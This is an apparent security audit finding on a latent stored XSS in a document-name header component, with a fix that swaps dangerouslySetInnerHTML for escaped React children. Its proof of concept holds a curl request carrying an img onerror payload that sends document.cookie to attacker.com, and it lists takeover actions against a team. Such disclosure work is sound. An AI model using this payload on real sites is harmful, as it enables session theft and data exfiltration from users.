# Finding: Latent Stored XSS via dangerouslySetInnerHTML on prismaDocument.name

## Severity
HIGH (latent)

## CVSS Estimate
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N = 8.0 (latent — the sink is wrong, every active write path currently sanitizes, but a single new write path that forgets the sanitize step fires XSS in every team member's session).

## Affected Code
- File: `components/documents/document-header.tsx`
- Line: 604 (`dangerouslySetInnerHTML={{ __html: prismaDocument.name }}` inside a `contentEditable` `<h2>`)
- Function: `DocumentHeader` component
- Endpoint: n/a — server-rendered React component; reaches every dashboard page that renders `<DocumentHeader prismaDocument={document} />`

- Write paths that currently sanitize via `sanitizePlainText` (verified safe today):
  - `pages/api/teams/[teamId]/documents/[id]/update-name.ts:13-22` — `updateNameSchema` runs `.transform((value) => sanitizePlainText(value))`
  - `lib/zod/url-validation.ts:202-213` — `documentUploadSchema`
  - `app/(ee)/api/links/[id]/upload/route.ts:210` — `sanitizedDocumentName = sanitizePlainText(documentData.name)`

## Description
Document names are user-controlled. They flow through a Zod schema with a `sanitizePlainText` transform that strips all HTML tags. **Today** every write path runs the value through `sanitizePlainText`, so the `dangerouslySetInnerHTML` sink sees a plain-text string. But the structural risk is that the sink is unsanitized at render time: any future write path that bypasses the Zod transform (Notion import, bulk-import, API consumer, admin migration, restored legacy data) immediately turns into stored XSS. **The defense is at the wrong layer.**

The `<h2>` is `contentEditable`, so the self-XSS vector (paste HTML, then submit) is also live — same user, but it demonstrates the sink is unsafe.

## Proof of Concept

### Pre-conditions
- Attacker is a team member (any role, including VIEWER — see `pages/api/teams/[teamId]/documents/[id]/update-name.ts` which does not gate by role; the role gate is at the `getServerSession` + `userTeam` membership level only).
- Attacker has access to the `POST /api/teams/:teamId/documents/:id/update-name` endpoint for at least one document in the team.

### Step-by-step exploitation (latent — works as soon as a future write path bypasses sanitize)

1. **Attacker submits a document name update with HTML** (bypassing the client-side Zod transform by going directly to the API):
   ```bash
   curl -X POST \
     'https://app.papermark.com/api/teams/<teamId>/documents/<docId>/update-name' \
     -H 'Content-Type: application/json' \
     -H 'Cookie: __Secure-next-auth.session-token=<attacker_session_jwt>' \
     -d '{"name": "<img src=x onerror=\"fetch(\"https://attacker.com/?c=\"+document.cookie)\">"}'
   ```
   **Today**: the server's Zod transform at line 13-22 runs `sanitizePlainText` which strips every tag → the stored value is plain text. The XSS is latent.

2. **Hypothetical (a future write path that forgets the sanitize):** the value is stored verbatim. When any team member loads a page that renders the document header (e.g. `app/(dashboard)/documents/[id]/page.tsx`, the `documents` listing, the visitor-side `view/...` pages), the `<h2>` at line 596-605 of `document-header.tsx` executes:
   ```tsx
   <h2
     dangerouslySetInnerHTML={{ __html: prismaDocument.name }}
   />
   ```
   The injected `<img onerror>` fires. The `onerror` handler can:
   - Read `document.cookie` (NextAuth's `next-auth.session-token` is `httpOnly` so direct theft requires the XSS to perform an authenticated mutation on behalf of the victim — which is fully possible)
   - Issue authenticated XHR to any `/api/teams/<teamId>/**` endpoint
   - Change the team plan, add/remove members, rotate SSO, edit billing
   - Exfiltrate all team data via XHR-fetched SWR endpoints

3. **Self-XSS vector (live today):** the `<h2>` is `contentEditable`, so the attacker can paste HTML into the document name, blur to submit, and the XSS fires in their own session. The Zod transform strips the HTML, so today's self-XSS is also latent — but the sink would fire if the Zod transform were ever weakened or removed.

## Impact
- **Stored XSS in every team member's session** (once a future write path bypasses sanitize). The document name appears on the dashboard's `documents` listing and on the document detail page, so the payload runs on every page load.
- **CSRF-style actions via XHR**: change team plan, add/remove members, rotate SSO, edit billing.
- **Exfiltration of all team data** via the XSS-fetched SWR endpoints.
- **Session hijack**: NextAuth's `next-auth.session-token` cookie is `httpOnly` so direct theft requires the XSS to perform an authenticated mutation on behalf of the victim (fully possible). The XSS can mint Trigger.dev tokens (via F-014), mint presigned S3 URLs (via `/api/file/s3/get-presigned-get-url`), and read all team documents.

## Evidence
```tsx
// components/documents/document-header.tsx:596-605
<h2
  className="truncate rounded-md border border-transparent px-1 py-0.5 text-base font-semibold tracking-tight text-foreground duration-200 hover:cursor-text hover:border hover:border-border focus-visible:text-base sm:text-lg sm:focus-visible:text-lg lg:px-3 lg:py-1 lg:text-xl sm:focus-visible:text-xl xl:text-2xl"
  ref={nameRef}
  contentEditable={true}
  onFocus={() => setIsEditingName(true)}
  onBlur={handleNameSubmit}
  onKeyDown={preventEnterAndSubmit}
  title="Click to edit"
  dangerouslySetInnerHTML={{ __html: prismaDocument.name }}  // ← unsafe sink
/>
```
The component treats `prismaDocument.name` as raw HTML. Today the value is plain text (sanitized at write); the XSS is **latent** — but the sink is wrong.

## Methodology
- **M1 — Structural analysis** (`methodology-raw/01-structural-analysis.md` Finding 7 — full source→sink call chain)
- **M2 — SAST** (`methodology-raw/02-synthesized-sast.md` S-002 — confirmed sink)
- **M3 — Sanitizer-bypass** (`methodology-raw/01-sanitizer-bypass.md` N1 — every active write path runs `sanitizePlainText`)
- **M2 — Web synthesis** (`methodology-raw/00-early-web-intel.md` Directive D11)

## Chain Potential
- **Chain 3 / Chain 8** (`methodology-raw/05-chains.md`) — the same sink cluster (`prismaDocument.name` + `domainJson.apexName`) is the DOM-XSS defense-in-depth finding M-004.
- **F-014** (missing-auth progress token) — the XSS can mint Trigger.dev tokens to exfiltrate document processing state.
- **F-001/F-004** (4-purpose NEXTAUTH_SECRET) — the XSS can read the team's `NEXTAUTH_SECRET` from the server's environment if the chain reaches RCE.

## Remediation
**Replace the sink.** React auto-escapes string children. The `contentEditable` attribute does not require `dangerouslySetInnerHTML` — it requires a DOM node whose `textContent` is editable.

```tsx
// Replace line 604 with:
<h2
  className="truncate rounded-md border border-transparent px-1 py-0.5 ..."
  ref={nameRef}
  contentEditable={true}
  onFocus={() => setIsEditingName(true)}
  onBlur={handleNameSubmit}
  onKeyDown={preventEnterAndSubmit}
  title="Click to edit"
>
  {prismaDocument.name}
</h2>
```

This eliminates the entire class of stored-XSS regressions for this field. If a styled placeholder is needed, render an explicit `<span>` child instead of an HTML string.

Apply the same fix to **all** `dangerouslySetInnerHTML` call sites in the codebase. Audit at `methodology-raw/01-sanitizer-bypass.md` N6 lists the other 4 sinks. Each should be evaluated: is the input guaranteed to be plain text? If yes, replace with `{value}`. If no, add a sanitizer at the sink.
